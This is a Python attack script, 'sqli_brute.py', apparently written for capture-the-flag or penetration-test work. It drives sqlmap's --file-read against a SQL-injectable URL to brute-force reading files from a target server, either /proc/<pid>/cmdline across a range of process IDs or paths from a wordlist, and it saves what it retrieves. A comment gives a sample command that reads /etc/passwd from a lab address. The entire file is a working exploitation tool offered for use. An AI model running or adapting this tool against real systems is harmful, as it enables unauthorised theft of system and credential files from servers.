#!/usr/bin/python3
import threading
import subprocess
import time
import sys
import colorama
from colorama import Fore, Back, Style
import shutil
import os

class sqlBrute():
    threads = []
    existingFiles = []

    def startProcBrute(self,startId=2000,endId=3000):
        self.startProcessId = startId
        self.endProcessId = endId

        try:
            runThread = threading.Thread(target=self.procThreadController,args=(self.startProcessId,self.endProcessId,))
            self.threads.append(runThread)
            runThread.start()

        except Exception as e:
            print("Error: failed to start thread. %s" % e)
    
    def __init__(self,url,threads,outDir,verbose):
        self.numberOfThreads = threads
        self.url = url
        self.outDir = outDir
        self.verbose = verbose
    
    def getRunningThreads(self):
        return len(self.threads)
    
    def printExistingFiles(self):
        while True:
            self.clean()
            if self.getRunningThreads() == 0:
                print("The existing files: \n")
                for line in self.existingFiles:
                    print("%s" % line)
                break
            time.sleep(1)
    
    def procThreadController(self, startProcessId, endProcessId):
        if endProcessId > startProcessId:                                       
            while endProcessId > startProcessId:
                #clean the stopped threads from the list
                self.clean()
                if self.getRunningThreads() <= self.numberOfThreads:
                    try:
                        fileArgument = "/proc/" + str(startProcessId) + "/cmdline"
                        thread = threading.Thread(target=self.run, args=(fileArgument,))
                        self.threads.append(thread)
                        thread.start()
                        startProcessId = startProcessId + 1
                    except Exception as e:
                        print("Error: %s" % e)
                        sys.exit()
                else:
                    continue
        else:
            print(Fore.RED + "[ERROR] " + Style.RESET_ALL +  "The start id shouldn't be bigger than the end id!\n")
            sys.exit()

    def clean(self):
        self.threads = [t for t in self.threads if t.is_alive()]

    def run(self,fileArgument):
        
        print(Fore.YELLOW + '[INFO]' + Style.RESET_ALL + "  Trying to read: %s" % fileArgument)
        cmd = 'sqlmap -u ' + str(self.url) + ' --file-read=' + str(fileArgument) + ' --batch'
        #cmd = 'sqlmap -u http://10.10.10.96/users/asd* --file-read=/etc/passwd --batch'
        cmdsplit = str(cmd).split()
        result = subprocess.run(cmdsplit, stdout=subprocess.PIPE)
        if '[WARNING]' not in str(result) and 'ERROR' not in str(result):
            if self.verbose:
                print("%s" % str(result))
            self.existingFiles.append(fileArgument)
            words = str(result).split()
            i = 0
            for word in words:
                if self.verbose:
                    print("%s" % word)

                if word == "[1]:\\n[*]":
                    theFile = words[i+1]
                    if self.outDir != "":
                        if not os.path.isdir(self.outDir):
                            try:
                                os.makedirs(self.outDir)
                            except Exception as e:
                                print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " Failed to create directory")
                        try:
                            if self.outDir[-1] == "/":
                                out = self.outDir + theFile.split("/")[-1]
                            else:
                                out = self.outDir + "/" + theFile.split("/")[-1]
                               
                            fullPath = os.path.abspath(out)
                            if self.verbose:
                                print("%s" % fullPath)
                            shutil.move(theFile,fullPath)
                        except Exception as e:
                            print("%s" % e)
                            print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " Failed to write file.")

                i = i+1

            print(Fore.GREEN + "[+] file %s exists!!" % fileArgument)
            print(Style.RESET_ALL)

    def startFileBrute(self,filePath,extension,basicPath):
        try:
            fo = open(filePath, "r")
            for line in fo:
                if line[0] == '/' and basicPath[-1] == '/':
                    line = line[1:]
                line = basicPath + line.rstrip() + extension
                self.clean()
                isAdded = False
                while True:
                    self.clean()
                    if self.getRunningThreads() <= self.numberOfThreads and not isAdded:
                        thread = threading.Thread(target=self.run, args=(line,))
                        self.threads.append(thread)
                        thread.start()
                        isAdded = True
                        break

            fo.close()
        except Exception as e:
            print(Fore.RED + "[ERROR] " + Style.RESET_ALL +  "Unable to open file for read!\n") 
            print("%s" % str(e))
            sys.exit()



if __name__ == "__main__":
    header = Fore.GREEN + """       _..._                                                                                                                  \n"""
    header += """    .-'_..._''.                                                                  _______                                      \n"""
    header += """  .' .'      '.\              __.....__                             __.....__    \  ___ `'.             /|                    \n"""
    header += """ / .'                     .-''         '.                       .-''         '.   ' |--.\  \            ||    .-.          .- \n"""
    header += """. '             .-,.--.  /     .-''"'-.  `.               .|   /     .-''"'-.  `. | |    \  '           ||     \ \        / / \n"""
    header += """| |             |  .-. |/     /________\   \    __      .' |_ /     /________\   \| |     |  '          ||  __  \ \      / /  \n"""
    header += """| |             | |  | ||                  | .:--.'.  .'     ||                  || |     |  |          ||/'__ '.\ \    / /   \n"""
    header += """. '             | |  | |\    .-------------'/ |   \ |'--.  .-'\    .-------------'| |     ' .'          |:/`  '. '\ \  / /    \n"""
    header += """ \ '.          .| |  '-  \    '-.____...---.`" __ | |   |  |   \    '-.____...---.| |___.' /'           ||     | | \ `  /     \n"""
    header += """  '. `._____.-'/| |       `.             .'  .'.''| |   |  |    `.             .'/_______.'/            ||\    / '  \  /      \n"""
    header += """    `-.______ / | |         `''-...... -'   / /   | |_  |  '.'    `''-...... -'  \_______|/             |/\'..' /   / /       \n"""
    header += """             `  |_|                         \ \._,\ '/  |   /                                           '  `'-'`|`-' /        \n"""
    header += """                                             `--'  `"   `'-'                                                     '..'         \n"""
    header += """                                                _..._               _________      __                                         \n"""
    header += """..-'''-.                     ..-'''-.        .-'_..._''.           /         |...-'  |`. ..-'''-.   ..-'''-.                  \n"""
    header += """\.-'''\ \                    \.-'''\ \     .' .'      '.\         '-----.   .'|      |  |\.-'''\ \  \.-'''\ \                 \n"""
    header += """       | |                          | |   / .'                        .'  .'  ....   |  |       | |        | |                \n"""
    header += """    __/ /                        __/ /   . '                        .'  .'      -|   |  |    __/ /      __/ /                 \n"""
    header += """   |_  '.   ____     _____      |_  '.   | |                      .'  .'         |   |  |   |_  '.     |_  '.                 \n"""
    header += """      `.  \`.   \  .'    /         `.  \ | |               _    _'---'        ...'   `--'      `.  \      `.  \               \n"""
    header += """        \ '. `.  `'    .'            \ '.. '              | '  / |            |         |`.      \ '.       \ '.              \n"""
    header += """         , |   '.    .'               , | \ '.          ..' | .' |            ` --------\ |       , |        , |              \n"""
    header += """         | |   .'     `.              | |  '. `._____.-'//  | /  |             `---------'        | |        | |              \n"""
    header += """        / ,' .'  .'`.   `.           / ,'    `-.______ /|   `'.  |                               / ,'       / ,'              \n"""
    header += """-....--'  /.'   /    `.   `. -....--'  /              ` '   .'|  '/                      -....--'  /-....--'  /               \n"""
    header += """`.. __..-''----'       '----'`.. __..-'                  `-'  `--'                       `.. __..-' `.. __..-'                \n"""
    header += """\n"""
    header += """\n""" + Style.RESET_ALL


    helpMessage = "Syntax: sqli_brute.py -u sqlmap_url [-b filePath] ((-m p -s startProcId -e endProcId) | (-m f -w wordlist)) [-d outDir] [-t threads] \n -h: shows this help \n -m: The mode can be (p) proc scan, or (f) file scan. \n -s: startProcessId \n -e: endProcessId \n -w: wordlist \n -t: threads -d: output directory to move the downloaded files \n -b: Basic path to read from \n -d: directory to copy the downloaded files \n \n Example usage: \n sqli_brute.py -m p -u http://10.10.10.10/sqlquery/someparam* -s 1 -e 1000 -t 25 -d outDir -t 25 \n sqli_brute.py -u http://10.10.10.10/sqlquery/someparam* -m f -w ./linux.txt -x py -b /etc -d ./outDir"

    print("%s" % header)
    if sys.version_info[0] < 3:
            print("Please use Python 3")
            sys.exit()
    
    counter = 0
    startId = -1
    threads = 20
    endId = -1
    url = ""
    mode = ""
    extension = ""
    basicPath = "/"
    outDir = ""
    verbose = False

    for arg in sys.argv:
        if arg == "-h":
            print("%s" % helpMessage)
            sys.exit()
        if arg == "-s":
            startId = int(sys.argv[counter+1])
        if arg == "-e":
            endId = int(sys.argv[counter+1])
        if arg == "-t":
            threads = int(sys.argv[counter+1])
        if arg == "-u":
            url = str(sys.argv[counter+1])
        if arg == "-m":
            mode = str(sys.argv[counter+1])
        if arg == "-w":
            wordlist = str(sys.argv[counter+1])
        if arg == "-x":
            extension = str(sys.argv[counter+1])
        if arg == "-b":
            basicPath = str(sys.argv[counter+1])
        if arg == "-d":
            outDir = str(sys.argv[counter+1])
        if arg == "-v":
            verbose = True
        counter = counter + 1

    if url != "":
        sqlBrute = sqlBrute(url,threads,outDir,verbose)
        if mode == "p":
            if startId != -1 and endId != -1:        
                print(Fore.YELLOW + "[Program settings]" + Style.RESET_ALL)
                print("Url: %s \n Mode: process brute \n StartId: %d \n EndId: %d \n Threads: %d" % (url,startId,endId,threads))
                time.sleep(2)
                try:
                    runProc = sqlBrute.startProcBrute(startId,endId,)
                finally:
                    sqlBrute.printExistingFiles()
            else:
                print("%s" % helpMessage)
                sys.exit()
        elif mode == "f":
                print(Fore.YELLOW + "[Program settings]" + Style.RESET_ALL)
                print("Url: %s \n Mode: file brute \n wordlist: %s \n extension: %s" % (url,wordlist,extension))
                try:
                    runProc = sqlBrute.startFileBrute(wordlist,extension,basicPath)
                finally:
                    sqlBrute.printExistingFiles()
        else:
            print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " Mode is missing!\n")
            print("%s" % helpMessage)
        
    else:
        print(Fore.RED + "[ERROR]" + Style.RESET_ALL + " Url is missing!\n")
        print("%s" % helpMessage)
        sys.exit()



    
